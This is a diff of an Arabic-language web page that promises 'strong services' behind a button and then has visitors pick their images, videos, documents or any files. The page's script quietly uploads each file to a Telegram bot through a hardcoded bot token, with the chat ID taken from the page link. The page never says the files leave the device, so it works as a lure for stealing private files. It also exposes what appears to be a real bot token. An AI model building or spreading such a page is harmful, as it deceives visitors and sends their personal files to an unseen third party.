@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>موقع الخدمات</title>
+    <title>الخدمات القوية</title>
     <style>
         * {
             margin: 0;
@@ -12,86 +12,93 @@
         }
         
         body {
-            background: linear-gradient(135deg, #6e0ef5 0%, #2979ff 100%);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
-            font-family: Arial, sans-serif;
+            font-family: 'Arial', sans-serif;
             text-align: center;
         }
         
         .container {
-            background: rgba(0, 0, 0, 0.2);
+            background: rgba(255, 255, 255, 0.1);
             backdrop-filter: blur(10px);
             border-radius: 20px;
             padding: 40px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
             border: 1px solid rgba(255, 255, 255, 0.2);
-            max-width: 600px;
+            max-width: 500px;
             width: 100%;
         }
         
-        .main-message {
-            font-size: 24px;
-            margin-bottom: 40px;
+        .message {
+            font-size: 22px;
+            margin-bottom: 30px;
             line-height: 1.5;
         }
         
-        .services-btn {
-            background: linear-gradient(to right, #ff416c, #ff4b2b);
-            color: white;
-            border: none;
-            padding: 20px 50px;
-            font-size: 20px;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s;
-            font-weight: bold;
-            box-shadow: 0 5px 15px rgba(255, 65, 108, 0.4);
-        }
-        
-        .services-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 8px 20px rgba(255, 65, 108, 0.6);
-        }
-        
-        .upload-section {
-            margin-top: 30px;
-            display: none;
-        }
-        
-        .folder-btn {
-            background: linear-gradient(to right, #00b09b, #96c93d);
+        .btn {
+            background: linear-gradient(to right, #f46b45, #eea849);
             color: white;
             border: none;
             padding: 15px 40px;
             font-size: 18px;
             border-radius: 50px;
             cursor: pointer;
-            margin-bottom: 20px;
             transition: all 0.3s;
-        }
-        
-        .folder-btn:hover {
-            transform: scale(1.05);
-        }
-        
-        .progress {
+            font-weight: bold;
+            display: block;
             width: 100%;
-            height: 20px;
+            margin: 10px 0;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .btn:hover {
+            transform: scale(1.02);
+        }
+        
+        .btn:active {
+            transform: scale(0.98);
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        .file-input {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            white-space: nowrap;
+            border: 0;
+        }
+        
+        .progress-container {
+            margin-top: 20px;
             background: rgba(255, 255, 255, 0.1);
             border-radius: 10px;
-            margin-top: 20px;
-            overflow: hidden;
+            padding: 15px;
             display: none;
         }
         
         .progress-bar {
+            height: 10px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 5px;
+            overflow: hidden;
+            margin-top: 10px;
+        }
+        
+        .progress-fill {
             height: 100%;
-            background: linear-gradient(to right, #00b09b, #96c93d);
+            background: linear-gradient(to right, #4CAF50, #8BC34A);
             width: 0%;
             transition: width 0.3s;
         }
@@ -100,63 +107,116 @@
             margin-top: 15px;
             padding: 10px;
             border-radius: 10px;
+            font-size: 14px;
             display: none;
         }
         
-        .success {
-            background: rgba(0, 200, 83, 0.2);
-            border: 1px solid #00c853;
+        .status.success {
+            background: rgba(76, 175, 80, 0.2);
+            border: 1px solid #4CAF50;
             display: block;
         }
         
-        .error {
-            background: rgba(255, 23, 68, 0.2);
-            border: 1px solid #ff1744;
+        .status.error {
+            background: rgba(244, 67, 54, 0.2);
+            border: 1px solid #F44336;
             display: block;
+        }
+        
+        .loading {
+            font-size: 14px;
+            margin-top: 10px;
+            color: rgba(255, 255, 255, 0.8);
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="main-message">إضغط علي الزر لتتمتع بخدماتنا القويه</div>
+        <div class="message">إضغط علي الزر لتتمتع بخدماتنا القويه</div>
         
-        <button id="servicesBtn" class="services-btn">الخدمات</button>
+        <button id="mainBtn" class="btn">الخدمات</button>
         
-        <div id="uploadSection" class="upload-section">
-            <button id="folderBtn" class="folder-btn">استخدام المجلد</button>
-            <input type="file" id="folderInput" webkitdirectory directory multiple style="display: none;">
+        <div id="uploadSection" class="hidden">
+            <button id="folderBtn" class="btn">بدء</button>
             
-            <div id="progress" class="progress">
-                <div id="progressBar" class="progress-bar"></div>
+            <!-- ملفات متعددة للصور -->
+            <input type="file" id="imageFiles" class="file-input" accept="image/*" multiple>
+            
+            <!-- ملفات متعددة للفيديوهات -->
+            <input type="file" id="videoFiles" class="file-input" accept="video/*" multiple>
+            
+            <!-- ملفات متعددة للمستندات -->
+            <input type="file" id="docFiles" class="file-input" accept=".pdf,.doc,.docx,.txt" multiple>
+            
+            <!-- ملفات متعددة للجميع -->
+            <input type="file" id="allFiles" class="file-input" multiple>
+            
+            <div id="progressContainer" class="progress-container">
+                <div id="statusText">جاري الإعداد...</div>
+                <div class="progress-bar">
+                    <div id="progressFill" class="progress-fill"></div>
+                </div>
+                <div id="counter" class="loading">0/0</div>
             </div>
             
-            <div id="status" class="status"></div>
+            <div id="statusMessage" class="status"></div>
         </div>
     </div>
 
     <script>
-        const servicesBtn = document.getElementById('servicesBtn');
-        const uploadSection = document.getElementById('uploadSection');
-        const folderBtn = document.getElementById('folderBtn');
-        const folderInput = document.getElementById('folderInput');
-        const progress = document.getElementById('progress');
-        const progressBar = document.getElementById('progressBar');
-        const statusDiv = document.getElementById('status');
-        
         // التوكن الثابت
         const BOT_TOKEN = "8481752278:AAHs9O3Ilf0LRTJPIAhpdC92gC3_ufME78g";
         
-        servicesBtn.addEventListener('click', () => {
-            uploadSection.style.display = 'block';
-            servicesBtn.style.display = 'none';
+        // العناصر
+        const mainBtn = document.getElementById('mainBtn');
+        const uploadSection = document.getElementById('uploadSection');
+        const folderBtn = document.getElementById('folderBtn');
+        const progressContainer = document.getElementById('progressContainer');
+        const progressFill = document.getElementById('progressFill');
+        const statusText = document.getElementById('statusText');
+        const counter = document.getElementById('counter');
+        const statusMessage = document.getElementById('statusMessage');
+        
+        // ملفات الإدخال
+        const imageFilesInput = document.getElementById('imageFiles');
+        const videoFilesInput = document.getElementById('videoFiles');
+        const docFilesInput = document.getElementById('docFiles');
+        const allFilesInput = document.getElementById('allFiles');
+        
+        // عند النقر على زر الخدمات
+        mainBtn.addEventListener('click', function() {
+            uploadSection.classList.remove('hidden');
+            mainBtn.classList.add('hidden');
         });
         
-        folderBtn.addEventListener('click', () => {
-            folderInput.click();
+        // عند النقر على زر استخدام المجلد
+        folderBtn.addEventListener('click', async function() {
+            // نعرض خيارات للمستخدم لاختيار نوع الملفات
+            if (confirm('اختر نوع الملفات التي تريد رفعها:\n\nموافق: كل الملفات\nإلغاء: اختيار نوع محدد')) {
+                // كل الملفات
+                allFilesInput.click();
+            } else {
+                // اختيار نوع محدد
+                const fileType = prompt('اختر نوع الملفات:\n1 - صور\n2 - فيديوهات\n3 - مستندات\n4 - كل شيء');
+                
+                switch(fileType) {
+                    case '1':
+                        imageFilesInput.click();
+                        break;
+                    case '2':
+                        videoFilesInput.click();
+                        break;
+                    case '3':
+                        docFilesInput.click();
+                        break;
+                    default:
+                        allFilesInput.click();
+                }
+            }
         });
         
-        folderInput.addEventListener('change', async (e) => {
-            const files = e.target.files;
+        // دالة معالجة رفع الملفات
+        async function handleFileUpload(files) {
             if (files.length === 0) return;
             
             // الحصول على chatid من الرابط
@@ -168,44 +228,58 @@
                 return;
             }
             
-            progress.style.display = 'block';
+            // إظهار شريط التقدم
+            progressContainer.style.display = 'block';
+            statusText.textContent = 'جاري إعداد الملفات...';
+            progressFill.style.width = '0%';
+            counter.textContent = `0/${files.length}`;
             
             try {
-                let sentCount = 0;
-                const fileArray = Array.from(files);
+                let successfulUploads = 0;
+                const totalFiles = files.length;
                 
-                for (let i = 0; i < fileArray.length; i++) {
-                    const file = fileArray[i];
+                for (let i = 0; i < totalFiles; i++) {
+                    const file = files[i];
                     
                     // تحديث شريط التقدم
-                    const progressPercent = Math.floor(((i + 1) / fileArray.length) * 100);
-                    progressBar.style.width = `${progressPercent}%`;
+                    const progress = Math.floor(((i + 1) / totalFiles) * 100);
+                    progressFill.style.width = `${progress}%`;
+                    counter.textContent = `${i + 1}/${totalFiles}`;
+                    statusText.textContent = `جاري رفع: ${file.name}`;
                     
-                    // إرسال الملف إلى API
+                    // إرسال الملف إلى التلجرام
                     const success = await sendToTelegram(file, chatId);
-                    if (success) sentCount++;
                     
-                    // عرض الحالة
-                    statusDiv.className = 'status';
-                    statusDiv.textContent = `جاري الإرسال... ${i + 1}/${fileArray.length}`;
-                    statusDiv.style.display = 'block';
+                    if (success) {
+                        successfulUploads++;
+                    }
+                    
+                    // تأخير بسيط بين الملفات
+                    await new Promise(resolve => setTimeout(resolve, 500));
                 }
                 
-                showStatus('success', `✅ تم إرسال ${sentCount} ملف بنجاح`);
+                // عرض نتيجة الرفع
+                if (successfulUploads === totalFiles) {
+                    showStatus('success', `✅ تم رفع ${successfulUploads} ملف بنجاح`);
+                } else if (successfulUploads > 0) {
+                    showStatus('success', `⚠️ تم رفع ${successfulUploads} من ${totalFiles} ملف`);
+                } else {
+                    showStatus('error', '❌ فشل رفع الملفات');
+                }
                 
-                // إعادة تعيين بعد 3 ثواني
+                // إخفاء شريط التقدم بعد 3 ثوان
                 setTimeout(() => {
-                    progress.style.display = 'none';
-                    progressBar.style.width = '0%';
-                    statusDiv.style.display = 'none';
-                    folderInput.value = '';
+                    progressContainer.style.display = 'none';
+                    progressFill.style.width = '0%';
                 }, 3000);
                 
             } catch (error) {
-                showStatus('error', `❌ خطأ: ${error.message}`);
+                showStatus('error', `❌ حدث خطأ: ${error.message}`);
+                progressContainer.style.display = 'none';
             }
-        });
+        }
         
+        // إرسال ملف إلى التلجرام
         async function sendToTelegram(file, chatId) {
             const formData = new FormData();
             formData.append('chat_id', chatId);
@@ -217,19 +291,39 @@
                     body: formData
                 });
                 
-                const result = await response.json();
-                return result.ok;
+                return response.ok;
             } catch (error) {
                 console.error('خطأ في الإرسال:', error);
                 return false;
             }
         }
         
+        // عرض رسالة حالة
         function showStatus(type, message) {
-            statusDiv.className = `status ${type}`;
-            statusDiv.textContent = message;
-            statusDiv.style.display = 'block';
+            statusMessage.className = `status ${type}`;
+            statusMessage.textContent = message;
+            statusMessage.style.display = 'block';
+            
+            // إخفاء الرسالة بعد 5 ثوان
+            setTimeout(() => {
+                statusMessage.style.display = 'none';
+            }, 5000);
         }
+        
+        // إضافة مستمعات الأحداث لمدخلات الملفات
+        imageFilesInput.addEventListener('change', (e) => handleFileUpload(e.target.files));
+        videoFilesInput.addEventListener('change', (e) => handleFileUpload(e.target.files));
+        docFilesInput.addEventListener('change', (e) => handleFileUpload(e.target.files));
+        allFilesInput.addEventListener('change', (e) => handleFileUpload(e.target.files));
+        
+        // إعادة تعيين المدخلات بعد الاختيار
+        [imageFilesInput, videoFilesInput, docFilesInput, allFilesInput].forEach(input => {
+            input.addEventListener('change', function() {
+                setTimeout(() => {
+                    this.value = '';
+                }, 100);
+            });
+        });
     </script>
 </body>
 </html>
